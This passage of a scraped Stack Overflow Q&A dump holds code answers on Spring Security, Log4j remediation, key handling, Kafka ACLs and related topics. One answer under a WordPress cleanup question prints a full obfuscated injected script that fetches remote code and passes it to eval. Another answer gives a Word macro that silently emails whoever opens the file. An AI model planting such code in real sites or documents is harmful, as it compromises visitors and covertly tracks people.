        "body": "public class SpringAddonsMethodSecurityExpressionRoot extends SecurityExpressionRoot implements MethodSecurityExpressionOperations {\n\tprivate Object filterObject;\n\tprivate Object returnObject;\n\tprivate Object target;\n\tpublic SpringAddonsMethodSecurityExpressionRoot() {\n\t\tsuper(SecurityContextHolder.getContext().getAuthentication());\n\t}\n\t@SuppressWarnings(\"unchecked\")\n\tprotected <T extends Authentication> Optional<T> get(Class<T> expectedAuthType) {\n\t\treturn Optional.ofNullable(getAuthentication()).map(a -> a.getClass().isAssignableFrom(expectedAuthType) ? (T) a : null).flatMap(Optional::ofNullable);\n\t}\n\t@Override\n\tpublic void setFilterObject(Object filterObject) {\n\t\tthis.filterObject = filterObject;\n\t}\n\t@Override\n\tpublic Object getFilterObject() {\n\t\treturn filterObject;\n\t}\n\t@Override\n\tpublic void setReturnObject(Object returnObject) {\n\t\tthis.returnObject = returnObject;\n\t}\n\t@Override\n\tpublic Object getReturnObject() {\n\t\treturn returnObject;\n\t}\n\tpublic void setThis(Object target) {\n\t\tthis.target = target;\n\t}\n\t@Override\n\tpublic Object getThis() {\n\t\treturn target;\n\t}\n}",
        "score": 7,
        "is_accepted": true,
        "creation_date": "2023-05-16T12:58:24",
        "author": "ch4mp"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/70361367/how-can-i-find-vulnerable-log4j-programs-cve-2021-44228-on-a-windows-10-pc-and",
    "title": "How can I find vulnerable Log4j programs (CVE-2021-44228) on a Windows 10 PC and how to provide first aid when I cannot update to a fixed version?",
    "question_id": 70361367,
    "posted_date": "2021-12-15T04:37:49",
    "answers": [
      {
        "answer_id": 70361504,
        "body": "# Ensure we can run everything\nSet-ExecutionPolicy Bypass -Scope Process -Force\n# Escape characters in PowerShell: https://ss64.com/ps/syntax-esc.html\nWrite-Host \"Start iterating drives...\"\n$volumes = Get-WmiObject win32_volume -filter \"drivetype=3\"\nforeach ($volume in $volumes)\n{\n    $driveletter = $volume.driveletter # e.g. C:\n    if ($driveletter -ne $null)\n    {\n        $drivename   = $volume.name        # e.g. C:\\\n        Write-Host \"`n== Checking $driveletter... ==\"\n        # Find log4j-core*.jar files, directly\n        # and remove org/apache/logging/log4j/core/lookup/JndiLookup.class\n        # with zip.exe -q -d command.\n        # Use unzip -l | findstr JndiLookup as paranoia check.\n        Write-Host \"== Find log4j-core*.jar files... ==\"\n            Get-ChildItem -Path $drivename -Filter log4j-core*.jar -Recurse -ErrorAction SilentlyContinue | % {\n            Write-Host \"== $($_.FullName) ==\"\n            Write-Host \"> zip.exe -q -d `\"$($_.FullName)`\" `\"org/apache/logging/log4j/core/lookup/JndiLookup.class`\"\"\n            zip.exe -q -d \"$($_.FullName)\" \"org/apache/logging/log4j/core/lookup/JndiLookup.class\"\n            Write-Host \"> unzip.exe -l `\"$($_.FullName)`\" | findstr JndiLookup\"\n            unzip.exe -l \"$($_.FullName)\" | findstr JndiLookup\n            Write-Host \"== END ==\"\n        }\n        # Find JndiLookup.class in uncompressed directories on the file-system (aka *.class)\n        Write-Host \"== Find uncompressed JndiLookup.class files... ==\"\n        Get-ChildItem -Path $drivename -Filter JndiLookup.class -Recurse -ErrorAction SilentlyContinue | % {\n            Write-Host \"== $($_.FullName) ==\"\n            Write-Host \"> Remove-Item -Path `\"$($_.FullName)`\" -Force\"\n            Remove-Item -Path $_.FullName -Force\n            Write-Host \"== END ==\"\n        }\n    }\n}\n# Find embedded log4j-core*.jar files (\"Java \u00dcber JARs\" or shaded JARs, i.e., JARs in other JAR/WAR/etc.)\nWrite-Host \"== Find log4j-core*.jar files that are embedded into other archives... ==\"\nWrite-Host \"TODO: Not supported!\"\nWrite-Host \"INSTEAD APPLY: https://github.com/mergebase/log4j-detector\"\n# Find log4j in docker containers\nWrite-Host \"== Find log4j in docker containers... ==\"\nWrite-Host \"TODO: Not supported!\"\nWrite-Host \"READ: https://www.docker.com/blog/apache-log4j-2-cve-2021-44228/\"\nWrite-Host \"THUS, APPLY: docker scan\"\nWrite-Host \"Press ENTER to continue...\"\ncmd /c Pause | Out-Null",
        "score": 4,
        "is_accepted": false,
        "creation_date": "2021-12-15T04:47:44",
        "author": "CyberPetaNeuron"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/61676744/java-bouncy-castle-generated-es256-key-doesnt-work-with-jwt-io",
    "title": "Java Bouncy Castle generated ES256 key doesn&#39;t work with JWT.io",
    "question_id": 61676744,
    "posted_date": "2020-05-08T06:11:02",
    "answers": [
      {
        "answer_id": 61685115,
        "body": "//nopackage\nimport java.io.OutputStreamWriter;\nimport java.security.*;\nimport java.security.spec.ECGenParameterSpec;\nimport org.bouncycastle.asn1.ASN1Sequence;\nimport org.bouncycastle.asn1.pkcs.PrivateKeyInfo;\nimport org.bouncycastle.asn1.sec.ECPrivateKey;\nimport org.bouncycastle.openssl.PKCS8Generator;\nimport org.bouncycastle.openssl.jcajce.JcaPEMWriter;\nimport org.bouncycastle.openssl.jcajce.JcaPKCS8Generator;\nimport org.bouncycastle.util.io.pem.PemObject;\npublic class SO61676744ECKeyNoParam {\n\tpublic static void main (String[] args) throws Exception {\n\t\tSecurity.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());\n\t\tJcaPEMWriter wr = new JcaPEMWriter(new OutputStreamWriter(System.out));\n\n\t\tKeyPairGenerator gen = KeyPairGenerator.getInstance(\"EC\",\"BC\");\n\t\tgen.initialize(new ECGenParameterSpec(\"secp256r1\"));\n\t\tKeyPair key = gen.generateKeyPair();\n\t\tPrivateKeyInfo badp8 = PrivateKeyInfo.getInstance(key.getPrivate().getEncoded());\n\t\tECPrivateKey badsec = ECPrivateKey.getInstance(badp8.parsePrivateKey());\n\t\tECPrivateKey goodsec = new ECPrivateKey(256, badsec.getKey(), badsec.getPublicKey(), null);\n\t\tPrivateKeyInfo goodp8 = new PrivateKeyInfo(badp8.getPrivateKeyAlgorithm(), goodsec);\n\t\twr.writeObject(new PemObject(\"PRIVATE KEY\", goodp8.getEncoded()));\n\t\twr.writeObject(key.getPublic());\n\n\t\twr.close();\n\t}\n}",
        "score": 5,
        "is_accepted": true,
        "creation_date": "2020-05-08T13:55:35",
        "author": "dave_thompson_085"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/77161239/spring-boot-web-security-application-websecurityconfigureradapter-is-deprecated",
    "title": "Spring Boot Web Security Application, WebSecurityConfigurerAdapter is deprecated, what can I use instead to make my WebSecurityConfig class work?",
    "question_id": 77161239,
    "posted_date": "2023-09-22T20:32:10",
    "answers": [
      {
        "answer_id": 77161828,
        "body": "@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity\npublic class SecurityConfig {\n    @Autowired\n    private MySQLUserDetailsService mySQLUserDetailsService;\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();\n    }\n    @Autowired\n    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {\n        auth\n                .userDetailsService(mySQLUserDetailsService)\n                .passwordEncoder(passwordEncoder());\n    }\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http.authorizeHttpRequests(auth -> auth\n                .requestMatchers(\"/\", \"/home\", \"/register\", \"/css/**.css\", \"/js/**\").permitAll()\n                .anyRequest().authenticated())\n                .formLogin(config -> config.loginPage(\"/login\").permitAll())\n                .logout(LogoutConfigurer::permitAll);\n        return http.build();\n    }\n}",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2023-09-23T01:53:26",
        "author": "cant-code"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/66303231/wordpress-all-theme-plugin-js-file-is-adding-this-script-how-can-i-remove-that",
    "title": "WordPress all theme plugin js file is adding this script how can i remove that",
    "question_id": 66303231,
    "posted_date": "2021-02-21T09:18:03",
    "answers": [
      {
        "answer_id": 71241332,
        "body": ";if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//website.domain/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2022-02-23T12:14:49",
        "author": "Youssef Elmoumen"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/64550258/how-can-i-prevent-the-value-of-a-fixture-to-be-printed",
    "title": "How can I prevent the value of a fixture to be printed?",
    "question_id": 64550258,
    "posted_date": "2020-10-27T04:02:34",
    "answers": [
      {
        "answer_id": 67393351,
        "body": "import pytest\nclass Secret:\n    def __init__(self, value):\n        self.value = value\n    def __repr__(self):\n        return \"Secret(********)\"\n    def __str___(self):\n        return \"*******\"\ndef get_from_vault(key):\n    return \"something looked up in vault\"\n@pytest.fixture(scope='session')\ndef password():\n    return Secret(get_from_vault(\"key_in_value\"))\ndef login(username, password):\n    pass\ndef test_using_password(password):\n    # reference the value directly in a function\n    login(\"username\", password.value)\n    # If you use the value directly in an assert, it'll still log if it fails\n    assert \"something looked up in vault\" == password.value\n    # but won't be printed here\n    assert False",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2021-05-04T19:23:37",
        "author": "enderland"
      },
      {
        "answer_id": 67393351,
        "body": "==================================================================================== FAILURES ====================================================================================\n______________________________________________________________________________ test_using_password _______________________________________________________________________________\npassword = Secret(********)\n    def test_using_password(password):\n        # reference the value directly in a function\n        login(\"username\", password.value)\n        # If you use the value directly in an assert, it'll still log if it fails\n        assert \"something looked up in vault\" == password.value\n\n        # but won't be printed here\n>       assert False\nE       assert False\ntest_stuff.py:31: AssertionError\n============================================================================ short test summary info =============================================================================\nFAILED test_stuff.py::test_using_password - assert False",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2021-05-04T19:23:37",
        "author": "enderland"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/72493425/how-to-update-deprecated-websecurityconfigureradapter-with-userdetailsservice-in",
    "title": "How to update deprecated WebSecurityConfigurerAdapter with userDetailsService in Spring Boot 2.7",
    "question_id": 72493425,
    "posted_date": "2022-06-03T13:55:11",
    "answers": [
      {
        "answer_id": 72493426,
        "body": "public class SecurityConfiguration {\n    private final UserRepository userRepository;\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return PasswordEncoderFactories.createDelegatingPasswordEncoder();\n    }\n    @Bean\n    public UserDetailsService userDetailsService() {\n        return email -> {\n            log.debug(\"Authenticating '{}'\", email);\n            Optional<User> optionalUser = userRepository.findByEmailIgnoreCase(email);\n            return new AuthUser(optionalUser.orElseThrow(\n                    () -> new UsernameNotFoundException(\"User '\" + email + \"' was not found\")));\n        };\n    }\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http.authorizeRequests()...;\n        return http.build();\n    }\n}",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2022-06-03T13:55:11",
        "author": "Grigory Kislin"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/69264219/can-i-use-ssl-and-acl-authentication-authorization-only-for-ssl-listener-not-fo",
    "title": "Can I Use SSL and ACL authentication/authorization only for SSL listener (not for PLAINTEXT) in Kafka?",
    "question_id": 69264219,
    "posted_date": "2021-09-21T02:18:21",
    "answers": [
      {
        "answer_id": 69267360,
        "body": "    public class AllowPlaintextAuthSslAuthorizer extends AclAuthorizer {\n        @Override\n        public List<AuthorizationResult> authorize(AuthorizableRequestContext requestContext, List<Action> actions) {\n            if (\"PLAINTEXT\".equals(requestContext.listenerName())) {\n                return actions.stream()\n                    .map((Action a) -> AuthorizationResult.ALLOWED)\n                    .collect(Collectors.toList());\n            } else {\n                return super.authorize(requestContext, actions);\n            }\n        }\n    }",
        "score": 3,
        "is_accepted": true,
        "creation_date": "2021-09-21T06:30:06",
        "author": "Mickael Maison"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/59128925/ddd-how-to-properly-separate-permissions-and-roles",
    "title": "DDD how to properly separate permissions and roles",
    "question_id": 59128925,
    "posted_date": "2019-12-01T14:04:47",
    "answers": [
      {
        "answer_id": 59263938,
        "body": "class PermissionService {\n    userHasRightToUpdateText = (task : Task, user: User) => {\n        return (user.role.permissions.some(p => p.name == 'task:updateText:all')\n            || (user.role.permissions.some(p => p.name == 'task:updateText:account') && task.accountId == user.id));\n            //or whatever you auth logic is\n    }\n}\nclass TaskApplicationService {\n    constructor(private taskRepository: TaskRepository,\n        private userRepository: UserRepository,\n        private permissionService : PermissionService) { }\n    async updateText({ taskId, text, accountId, context }: { taskId: string, text: string, accountId?: string, context: Context }) {\n      const userId = context.user.id;\n      const user = await this.userRepository.findOne({ userId });\n      const task = await this.taskRepository.findOne({ taskId });\n      if (this.permissionService.userHasRightToUpdateText(task, user)) {\n        task.updateText({ text });\n        await this.taskRepository.save(task);\n      }\n      else {\n        throw new Error('not authorized');\n      }\n      // return TaskMapper.toDto(task);\n    }\n  }",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2019-12-10T04:25:11",
        "author": "Bohdan Stupak"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/66783717/how-to-make-salt-hash-using-php-to-register-new-account-from-web",
    "title": "How-to make salt hash using PHP to register new account from web?",
    "question_id": 66783717,
    "posted_date": "2021-03-24T10:57:52",
    "answers": [
      {
        "answer_id": 66791023,
        "body": "function CalculateSRP6Verifier($username, $password, $salt)\n{\n    // algorithm constants\n    $g = gmp_init(7);\n    $N = gmp_init('894B645E89E1535BBDAD5B8B290650530801B18EBFBF5E8FAB3C82872A3E9BB7', 16);\n    // calculate first hash\n    $h1 = sha1(strtoupper($username . ':' . $password), TRUE);\n    // calculate second hash\n    $h2 = sha1($salt.$h1, TRUE);\n    // convert to integer (little-endian)\n    $h2 = gmp_import($h2, 1, GMP_LSW_FIRST);\n    // g^h2 mod N\n    $verifier = gmp_powm($g, $h2, $N);\n    // convert back to a byte array (little-endian)\n    $verifier = gmp_export($verifier, 1, GMP_LSW_FIRST);\n    // pad to 32 bytes, remember that zeros go on the end in little-endian!\n    $verifier = str_pad($verifier, 32, chr(0), STR_PAD_RIGHT);\n    return $verifier;\n}",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2021-03-24T19:43:14",
        "author": "Stefano Borz&#236;"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/61467904/craking-long-rsa-keys-from-public-key-only",
    "title": "Craking long RSA keys from public key only",
    "question_id": 61467904,
    "posted_date": "2020-04-27T16:29:33",
    "answers": [
      {
        "answer_id": 61468947,
        "body": "import time\nn = 632459103267572196107100983820469021721602147490918660274601\nc = 795272974058324394239265341440\ntest_size = 100000\nstart_time = time.time()\nfor i in range(c-1, c-test_size, -2):\n    if n%i == 0:\n        print(i, n%i)\ntime_elapsed = (time.time() - start_time)\nprint(\"Elapsed Time for %i iterations: %f seconds\" % (test_size, time_elapsed))\nseconds_in_a_year = 31557600\nprojected_time = time_elapsed * (c / 2 / test_size) / seconds_in_a_year\nprint(\"Projected Time for %i iterations: %i years\" % (c, projected_time))",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2020-04-27T17:41:36",
        "author": "orangecaterpillar"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/25397680/is-there-way-to-notify-by-email-when-word-file-is-opened",
    "title": "Is there way to notify by email when word file is opened",
    "question_id": 25397680,
    "posted_date": "2014-08-20T02:00:46",
    "answers": [
      {
        "answer_id": 65720724,
        "body": "Option Explicit\nPrivate Sub Document_Open()\n\n    'only run when others open\n    If Application.userName <> \"My Name\" Then\n\n        With Application\n            .ScreenUpdating = False\n            .DisplayAlerts = False\n        End With\n\n        Dim outApp As Object\n        Dim outMail As Object\n        Dim strBody As String\n        Dim userName As String\n\n\n        Set outApp = CreateObject(\"Outlook.Application\")\n        Set outMail = outApp.createitem(0)\n\n        userName = Application.userName\n        strBody = userName & \" has opened my file\"\n\n        With outMail\n            .To = \"myEmail@myDomain.com\"\n            .CC = \"\"\n            .BCC = \"\"\n            .Subject = \"My file has been opened\"\n            .Body = strBody\n            '.Display\n            .Send\n        End With\n\n        Set outMail = Nothing\n        Set outApp = Nothing\n\n        With Application\n            .ScreenUpdating = True\n            .DisplayAlerts = True\n        End With\n    End If\n\nEnd Sub",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2021-01-14T09:19:00",
        "author": "DDV"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/21474847/sslhandshakeexception-java-security-cert-certpathvalidatorexception-non-null",
    "title": "SSLHandshakeException - java.security.cert.CertPathValidatorException: non-null policy tree required and policy tree is null",
    "question_id": 21474847,
    "posted_date": "2014-01-31T02:43:44",
    "answers": [
      {
        "answer_id": 62474996,
        "body": "java.security.cert.CertPathValidatorException: non-null policy tree required and policy tree is null\n        at sun.security.provider.certpath.PKIXMasterCertPathValidator.validate(PKIXMasterCertPathValidator.java:135)\n        at sun.security.provider.certpath.PKIXCertPathValidator.validate(PKIXCertPathValidator.java:233)\n        at sun.security.provider.certpath.PKIXCertPathValidator.validate(PKIXCertPathValidator.java:141)\n        at sun.security.provider.certpath.PKIXCertPathValidator.engineValidate(PKIXCertPathValidator.java:80)\n        at java.security.cert.CertPathValidator.validate(CertPathValidator.java:292)\n        at test.main(test.java:52)\nCaused by: java.security.cert.CertPathValidatorException: non-null policy tree required and policy tree is null\n        at sun.security.provider.certpath.PolicyChecker.processPolicies(PolicyChecker.java:572)\n        at sun.security.provider.certpath.PolicyChecker.checkPolicy(PolicyChecker.java:225)\n        at sun.security.provider.certpath.PolicyChecker.check(PolicyChecker.java:180)\n        at sun.security.provider.certpath.PKIXMasterCertPathValidator.validate(PKIXMasterCertPathValidator.java:125)\n        ... 5 more",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2020-06-19T12:49:28",
        "author": "neutronscott"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/58876566/are-there-two-root-keys-in-docker-content-trust",
    "title": "Are there two root keys in Docker Content Trust?",
    "question_id": 58876566,
    "posted_date": "2019-11-15T06:57:09",
    "answers": [
      {
        "answer_id": 69788292,
        "body": "$ cat ../.docker/trust/private/2817c387b869ede57bd209e40a3dfce967b70eca1eb3739bc58afba44665aaef.key\n-----BEGIN ENCRYPTED PRIVATE KEY-----\nrole: arif\nMIHuMEkGCSqGSIb3DQEFDTA8MBsGCSqGSIb3DQEFDDAOBAh/6HbWl/T/SAICCAAw\nHQYJYIZIAWUDBAEqBBAZpJBc+C9ABYY6UbMT3YSRBIGgiNT5fX9QqCOrGJ3lb3qw\n7JkC/4D0dtp75MYWaMbfYXvNm+muJXmVUpp5vh91onUW8Y8q+ymQTgDq3mN8+HLu\n4iRp46wXxilEKUxmXsYln/mxQI+jU7UwTTiLiy6LpR1vpBKdO8hhd/WObW25P+ah\nYjslB1P8fe9VeSsorAKM5zDnuaiVhHh7BjgVAiepDvmy/7zO3W7Rso4Kgg0UZkJn\nSA==\n-----END ENCRYPTED PRIVATE KEY-----",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-10-31T12:03:36",
        "author": "arif"
      },
      {
        "answer_id": 69788292,
        "body": "$ docker trust signer add --key cert.pem arif ec2-3-67-179-58.eu-central-1.compute.amazonaws.com/docker/haproxy\nAdding signer \"arif\" to ec2-3-67-179-58.eu-central-1.compute.amazonaws.com/docker/haproxy...\nInitializing signed repository for ec2-3-67-179-58.eu-central-1.compute.amazonaws.com/docker/haproxy...\nYou are about to create a new root signing key passphrase. This passphrase\nwill be used to protect the most sensitive key in your signing system. Please\nchoose a long, complex passphrase and be careful to keep the password and the\nkey file itself secure and backed up. It is highly recommended that you use a\npassword manager to generate the passphrase and keep it safe. There will be no\nway to recover this key. You can find the key in your config directory.\nEnter passphrase for new root key with ID 06665b8:\nRepeat passphrase for new root key with ID 06665b8:\nEnter passphrase for new repository key with ID b040c66:\nRepeat passphrase for new repository key with ID b040c66:\nSuccessfully initialized \"ec2-3-67-179-58.eu-central-1.compute.amazonaws.com/docker/haproxy\"\nSuccessfully added signer: arif to ec2-3-67-179-58.eu-central-1.compute.amazonaws.com/docker/haproxy",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-10-31T12:03:36",
        "author": "arif"
      },
      {
        "answer_id": 69788292,
        "body": "$ docker trust inspect ec2-3-67-179-58.eu-central-1.compute.amazonaws.com/docker/haproxy\n[\n    {\n        \"Name\": \"ec2-3-67-179-58.eu-central-1.compute.amazonaws.com/docker/haproxy\",\n        \"SignedTags\": [],\n        \"Signers\": [\n            {\n                \"Name\": \"arif\",\n                \"Keys\": [\n                    {\n                        \"ID\": \"2817c387b869ede57bd209e40a3dfce967b70eca1eb3739bc58afba44665aaef\"\n                    }\n                ]\n            }\n        ],\n        \"AdministrativeKeys\": [\n            {\n                \"Name\": \"Root\",\n                \"Keys\": [\n                    {\n                        \"ID\": \"5ed03b461b330c6d722c319bdfaa87e3d8b289a1213569248bdaa616a1a399c6\"\n                    }\n                ]\n            },\n            {\n                \"Name\": \"Repository\",\n                \"Keys\": [\n                    {\n                        \"ID\": \"b040c663463612c99130eca98ec827ef32a3bab73d2976403888443ce87899c6\"\n                    }\n                ]\n            }\n        ]\n    }\n]",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-10-31T12:03:36",
        "author": "arif"
      },
      {
        "answer_id": 72675534,
        "body": "# Retrieving Root ID\n$ grep -r \"root\" ~/.docker/trust/private\n/home/ubuntu/.docker/trust/private/0b6101527b2ac766702e4b40aa2391805b70e5031c04714c748f914e89014403.key:role: root\n# Using a Canonical ID that has signed 2 repos (mydtr/user1/repo1 and mydtr/user1/repo2). Note you can use a Wildcard.\n{\n  \"content-trust\": {\n    \"trust-pinning\": {\n      \"root-keys\": {\n         \"mydtr/user1/*\": [\n           \"0b6101527b2ac766702e4b40aa2391805b70e5031c04714c748f914e89014403\"\n         ]\n      }\n    },\n    \"mode\": \"enforced\"\n  }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-06-19T04:58:33",
        "author": "Jian"
      },
      {
        "answer_id": 72675534,
        "body": "# Retrieving Cert ID\n$ docker trust inspect mydtr/user1/repo1 | jq -r '.[].AdministrativeKeys[] | select(.Name==\"Root\") | .Keys[].ID'\n9430d6e31e3b3e240957a1b62bbc2d436aafa33726d0fcb50addbf7e2dfa2168\n# Using Cert Ids, by specifying 2 repositories by their DCT root ID. Example for using this may be different DTRs or maybe because the repository was initiated on different hosts, therefore having different canonical IDs.\n{\n  \"content-trust\": {\n    \"trust-pinning\": {\n      \"cert-ids\": {\n         \"mydtr/user1/repo1\": [\n           \"9430d6e31e3b3e240957a1b62bbc2d436aafa33726d0fcb50addbf7e2dfa2168\"\n         ],\n         \"mydtr/user2/repo1\": [\n           \"544cf09f294860f9d5bc953ad80b386063357fd206b37b541bb2c54166f38d08\"\n         ]\n      }\n    },\n    \"mode\": \"enforced\"\n  }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-06-19T04:58:33",
        "author": "Jian"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/55529159/how-to-detect-and-manage-disk-registry-network-activity-performed-by-a-loaded-dl",
    "title": "How to detect and manage disk/registry/network activity performed by a loaded DLL?",
    "question_id": 55529159,
    "posted_date": "2019-04-05T02:06:39",
    "answers": [
      {
        "answer_id": 55808635,
        "body": "using System;\nusing System.Collections;\nusing System.Reflection;\nusing System.Security;\nusing System.Security.Policy;\nusing System.Security.Permissions;\nnamespace ConsoleApplication1\n{\n    class Program\n    {\n        //Path to plugin library\n        public static string libname = @\"C:\\PROJECTS\\ConsoleApp1\\bin\\Debug\\ClassLib.dll\";\n        //Invokes plugin library in restricted AppDomain\n        //Grants access to the directory specified by allowedPath parameter\n        static void InvokeLibrary(string allowedPath=\"\")\n        {\n            var path = new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath;\n            //create restricted permission set\n            Evidence evidence = new Evidence();\n            evidence.AddHostEvidence(new Zone(SecurityZone.Internet));\n            PermissionSet permissionSet = SecurityManager.GetStandardSandbox(evidence);\n            //grant read access to plugin library file, so it can at least load successfully\n            permissionSet.AddPermission(new FileIOPermission(FileIOPermissionAccess.Read, libname));\n            permissionSet.AddPermission(new FileIOPermission(FileIOPermissionAccess.PathDiscovery, libname));\n            //grant read access to\n            if (allowedPath != \"\")\n            {\n                permissionSet.AddPermission(new FileIOPermission(FileIOPermissionAccess.Read, allowedPath));\n            }\n            AppDomainSetup appDomainSetup = new AppDomainSetup();\n            appDomainSetup.ApplicationBase = System.IO.Path.GetDirectoryName(path);\n\n            //create AppDomain with specified permissions\n            AppDomain domain = AppDomain.CreateDomain(\n                \"MyDomain\",\n                evidence,\n                appDomainSetup,\n                permissionSet\n                );\n\n            //create remoting wrapper\n            Type type = typeof(Wrapper);\n            Wrapper wrapper = (Wrapper)domain.CreateInstanceAndUnwrap(\n                type.Assembly.FullName,\n                type.FullName);\n            //invoke method\n            InvokeResult res = wrapper.Invoke(libname,\"c:\\\\dir\\\\file.txt\");\n            if (res.Success) Console.WriteLine(\"Invoke result: \" + res.Result);\n            else {\n                Console.WriteLine(\"Invoke error: \" + res.Error.GetType().ToString());\n                if (res.Error is SecurityException)\n                {\n                    Console.WriteLine(\"Demanded permissions:\\n\" + (res.Error as SecurityException).Demanded);\n                }\n            }\n\n            AppDomain.Unload(domain);\n        }\n        static void Main(string[] args)\n        {\n            //invoke plugin without explicit permissions\n            Console.WriteLine(\"First attempt...\");\n            InvokeLibrary();\n            //invoke plugin with specified directory access\n            Console.WriteLine(\"Second attempt...\");\n            InvokeLibrary(\"c:\\\\dir\\\\\");\n            Console.ReadKey();\n        }\n    }\n    //Object to pass between app domains\n    public class InvokeResult : MarshalByRefObject\n    {\n        public bool Success = false;\n        public string Result=\"\";\n        public Exception Error =null;\n    }\n    //Wrapper for remoting\n    public class Wrapper : MarshalByRefObject\n    {\n        public Exception lasterror;\n        public InvokeResult Invoke(string lib, string arg)\n        {\n            InvokeResult res = new InvokeResult();\n            try\n            {\n                //load plugin\n                Assembly ass = Assembly.LoadFile(lib);\n                Type t = ass.GetType(\"ClassLib.Class1\");\n                MethodInfo mi = t.GetMethod(\"DoWork\", BindingFlags.Static | BindingFlags.Public);\n                //invoke plugin method\n                res.Result = (string)mi.Invoke(null, new object[] { arg });\n                res.Success = true;\n\n            }\n            catch (TargetInvocationException ex)\n            {\n                res.Success = false;\n                if (ex.InnerException != null) res.Error = ex.InnerException;\n                else res.Error = ex;\n            }\n            return res;\n        }\n    }\n}\n/* Output:\nFirst attempt...\nInvoke error: System.Security.SecurityException\nDemanded permissions:\n<IPermission class=\"System.Security.Permissions.FileIOPermission, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\nversion=\"1\"\nRead=\"c:\\dir\\file.txt\"/>\nSecond attempt...\nInvoke result: The content of file.txt\n*/",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2019-04-23T05:57:00",
        "author": "SmallSoft"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/17488757/rsaparameters-to-pfx-x509certificate2-conversion",
    "title": "RSAParameters to pfx (X509Certificate2) conversion",
    "question_id": 17488757,
    "posted_date": "2013-07-05T08:19:26",
    "answers": [
      {
        "answer_id": 55811084,
